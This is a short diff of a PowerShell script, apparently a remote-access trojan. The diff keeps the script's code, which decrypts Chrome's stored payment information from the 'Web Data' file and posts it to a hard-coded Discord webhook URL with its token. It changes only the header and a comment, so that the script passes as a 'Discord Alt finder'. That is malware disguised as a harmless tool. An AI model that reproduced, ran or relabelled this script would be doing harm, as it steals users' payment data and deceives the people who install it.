@@ -1,4 +1,4 @@
-# PowerShell RAT to Steal Payment Information from Chrome and Send to Discord Webhook
+# PowerShell Discord Alt finder
 
 # Define the webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1453518648726523996/Uv-gp_SmhlEYcCARWsxAfkb3ZmTw_d_HsXgo9SLMtDfJ9da4c9YlhpxYEdsiTaRTHiOA"
@@ -15,7 +15,7 @@ function Decrypt-ChromePaymentInfo {
     return [System.Text.Encoding]::UTF8.GetString($dataProtector)
 }
 
-# Function to get Chrome payment information
+# Function to Discord alts
 function Get-ChromePaymentInfo {
     $profilePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
     $webDataFile = Join-Path -Path $profilePath -ChildPath "Web Data"
